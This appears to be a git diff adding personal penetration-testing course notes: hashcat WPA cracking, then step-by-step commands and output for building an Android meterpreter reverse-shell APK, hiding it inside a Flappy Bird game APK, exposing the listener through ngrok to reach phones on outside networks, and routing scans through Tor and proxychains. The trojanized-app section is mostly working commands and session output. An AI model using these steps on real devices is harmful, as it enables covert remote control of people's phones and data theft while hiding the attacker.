@@ -1098,6 +1098,144 @@ psw entropy = 18^62 = 6.7.10^77
 aircrack-ng -w rockyou.txt <output_file>.cap
 ```
 
-
-
 #### Hashcat
+- native on kali
+- `hascat --help` list options, including hashmodes
+`hashcat -a 0 -m 2500 <file>.hccapx <password file>`
+- -a : attack mode
+- -m : hash mode (example wpa)
+- need to convert .cap to .hccapx
+
+# Get accesss to android device
+## option 1 : setup android vm
+- use virtualbox
+- get android vm's vdi file : https://www.osboxes.org/android-x86/ untar file
+- chose "other linux 64bits" and use .vdi disk
+- display settings : may need to increase video memory and change graphics controller
+
+## option 2 : use regular android phone
+- create meterpreter payload :
+`msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=4447 -o reverse_tcp.apk`
+
+- start web server :
+```
+┌──(kali㉿kali)-[~]
+└─$ sudo service apache2 start
+[sudo] password for kali: 
+```
+- setup listener with msfconsole
+```
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set LHOST 192.168.1.23
+set LPORT 4447
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 192.168.1.23:4447 
+[*] Sending stage (78179 bytes) to 192.168.1.10
+[*] Meterpreter session 1 opened (192.168.1.23:4447 -> 192.168.1.10:47787) at 2022-09-21 10:17:31 +0200
+
+```
+# Evil-droid
+- `git clone https://github.com/M4sc3r4n0/Evil-Droid`
+- cd Evil-Droid
+- chmod +x evil-droid
+- sudo ./evil-droid
+- select option 1 + option=android/meterpreter/reverse_tcp + multi-handler
+
+# obfuscate payload apk with legimitme apk (example : flappy bird game apk)
+- get flappy-bird apk : https://flappy-bird.en.uptodown.com/android
+```
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ sudo msfvenom -x flappy-bird-1-3-en-android.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.23 LPORT=5555 -o flappybird.apk
+Using APK template: flappy-bird-1-3-en-android.apk
+[-] No platform was selected, choosing Msf::Module::Platform::Android from the payload
+[-] No arch selected, selecting arch: dalvik from the payload
+Error: apksigner not found. If it's not in your PATH, please add it.
+```
+- install apksigner
+```
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ sudo apt-get install apksigner
+```
+- easiest way to solve PATH issues : re-install apktool `sudo apt-get remove apktool`
+- follow step for Linux [apk tool install](https://ibotpeaches.github.io/Apktool/install/) ; https://raw.githubusercontent.com/iBotPeaches/Apktool/master/scripts/linux/apktool
+
+- install apk on android device + run listener on kali
+
+# Ngork : infect device on any external network
+```
+ngrok is the programmable network edge that adds connectivity, security, and observability to your apps with no code changes 
+```
+- create online account on https://ngrok.com/
+- download ngrok + install + setup
+- `./ngrok tcp 5555`
+```
+Hello World! https://ngrok.com/next-generation
+
+Session Status                online                                                                                                                                               
+Account                       jeanlefou (Plan: Free)                                                                                                 
+Version                       3.1.0                                                                   
+Region                        Europe (eu)                               
+Latency                       14ms                                                                                                                                                 
+Web Interface                 http://127.0.0.1:4040                                                                                                                                               
+Forwarding                    tcp://4.tcp.eu.ngrok.io:14047 -> localhost:5555                                                                                                                                                        Connections                   ttl     opn     rt1     rt5     p50     p90                                                                                                                                                                  
+                              0       0       0.00    0.00    0.00    0.00         
+
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ host 4.tcp.eu.ngrok.io      
+4.tcp.eu.ngrok.io has address 18.198.77.177
+
+┌──(kali㉿kali)-[~/dev/exploits_files]
+└─$ msfvenom -p -x flappy-bird-1-3-en-android.apk -p android/meterpreter/reverse_tcp LHOST=18.198.77.177 LPORT=14047 -o flappybird.apk
+```
+- msfconsole, 1 diff : set LHOST 0.0.0.0 # -> listen on any interface
+
+it worked!
+```
+msf6 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 0.0.0.0:5555 
+[*] Sending stage (78179 bytes) to 127.0.0.1
+[*] Meterpreter session 3 opened (127.0.0.1:5555 -> 127.0.0.1:41830) at 2022-09-21 12:27:38 +0200
+
+meterpreter > hostname
+[-] Unknown command: hostname
+meterpreter > help
+```
+
+# Section 18 : Introduction to anonymity
+- for personal use and for pentest use
+- example : fir scan, use vpn/tor browser/proxy
+
+## Tor browser
+- change ip address after X request/duration
+sudo apt update
+sudo apt-get install tor torbrowser-launcher #tor=service, torbrowser-launcher=browser
+torbrowser-launcher # on first run : get and install tor browser
+
+- to check if tor is running, access url : "http://check.torproject.org/"
+
+## proxychains with nmap
+- redirect nmap traffic to 3rd party entity
+service tor start
+service tor status
+sudo apt-get install proxychains
+sudo vim /etc/proxychains.conf
+# comment static_chain
+# uncomment
+# dynamic_chain
+# socks4 127.0.0.1 9050
+# socks5 127.0.0.1 9050
+proxychains firefox
+proxychains nmap nmap.org -F
+man proxychains
+```
+NAME
+       proxychains4 - redirect connections through proxy servers
+SYNOPSIS
+       proxychains4 --help
+       proxychains4 [ -f configfile.conf ] <program>
+DESCRIPTION
+       This program forces any tcp connection made by any given tcp client to follow through proxy (or proxy chain). It is a kind of proxifier.
+```
